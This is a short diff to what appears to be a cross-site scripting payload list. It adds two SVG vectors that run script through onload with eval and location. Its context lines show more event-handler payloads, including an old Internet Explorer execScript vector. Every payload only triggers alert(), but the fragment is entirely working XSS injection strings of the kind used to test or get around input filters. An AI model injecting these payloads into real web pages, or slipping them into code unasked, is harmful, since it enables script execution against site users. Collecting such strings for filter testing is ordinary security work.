@@ -30,6 +30,8 @@ XSS:
 <marquee/onstart=alert()>
 <video/poster/onerror=alert()>
 <isindex/autofocus/onfocus=alert()>
+<svg id=alert(1337) onload=eval(id)>
+<svg id=javascript:alert(1337) onload=location=id>
 
 IE vektor :
 <style onload='execScript("InputBox+1","VbScript");'>
